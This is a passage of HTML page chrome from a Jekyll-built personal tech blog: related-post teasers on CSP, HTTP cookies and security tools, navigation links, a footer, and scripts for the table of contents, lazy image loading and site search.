src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"> <span class="pl-3 pt-2 mb-2">Contents</span><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/content-security-policy/"><div class="card-body"> <span class="timeago small" > Nov 13, 2024 <i class="unloaded">2024-11-13T21:55:00+05:30</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Content Security Policy</h3><div class="text-muted small"><p> Content Security Policy (CSP) is a security feature that helps prevent various types of attacks, such as Cross-Site Scripting (XSS) and data injection attacks, by controlling the sources from which...</p></div></div></a></div><div class="card"> <a href="/posts/http-cookie/"><div class="card-body"> <span class="timeago small" > Nov 14, 2024 <i class="unloaded">2024-11-14T22:26:00+05:30</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>HTTP Cookie</h3><div class="text-muted small"><p> HTTP is stateless, meaning each request is independent, with no memory of previous requests. For example, if you visit a website and add items to a shopping cart, the server doesn’t remember your c...</p></div></div></a></div><div class="card"> <a href="/posts/security-tools/"><div class="card-body"> <span class="timeago small" > Nov 10, 2024 <i class="unloaded">2024-11-10T20:38:00+05:30</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Security Tools</h3><div class="text-muted small"><p> SECURITY ESSENTIALS NMAP Network Mapper (Nmap) is an open-source network analysis and security auditing tool written in C, C++, Python, and Lua. Scan Techniques root@96250515cfd7:/# nmap --help...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/content-security-policy/" class="btn btn-outline-primary" prompt="Older"><p>Content Security Policy</p></a> <a href="/posts/http-cookie/" class="btn btn-outline-primary" prompt="Newer"><p>HTTP Cookie</p></a></div></div></div></div><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lozad/dist/lozad.min.js"></script> <script type="text/javascript"> const imgs = document.querySelectorAll('.post-content img'); const observer = lozad(imgs); observer.observe(); </script><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"><p class="mb-0"> © 2025 <a href="https://twitter.com/gkgaurav31">Gaurav Kumar</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Trending Tags</h4><a class="post-tag" href="/tags/java/">java</a> <a class="post-tag" href="/tags/geeksforgeeks/">geeksforgeeks</a> <a class="post-tag" href="/tags/important/">important</a> <a class="post-tag" href="/tags/leetcode/">leetcode</a> <a class="post-tag" href="/tags/sde-sheet/">sde sheet</a> <a class="post-tag" href="/tags/arrays/">arrays</a> <a class="post-tag" href="/tags/neetcode150/">neetcode150</a> <a class="post-tag" href="/tags/binarytree/">binarytree</a> <a class="post-tag" href="/tags/dynamic-programming/">dynamic_programming</a> <a class="post-tag" href="/tags/interviewbit/">interviewbit</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.7.3/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="https://gkgaurav31.github.io{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script>
